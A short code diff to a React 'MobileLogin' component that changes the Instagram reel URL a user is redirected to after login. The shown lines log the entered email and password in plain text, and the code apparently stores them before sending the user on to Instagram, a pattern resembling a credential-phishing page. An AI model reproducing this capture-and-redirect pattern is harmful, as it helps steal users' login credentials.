@@ -26,7 +26,7 @@ const MobileLogin = () => {
       setEmail('');
       setPassword('');
       console.log(email, password)
-      window.location.href = 'https://www.instagram.com/reel/DdilBe0h2wv/?stkn=Zm9jOWtuZHM3eGEy';
+      window.location.href = 'https://www.instagram.com/reel/DYyd41LzyLe/?stkn=bHljZDR3OXpkb2p5';
     } catch (error) {
       console.error("Error adding document: ", error);
     }
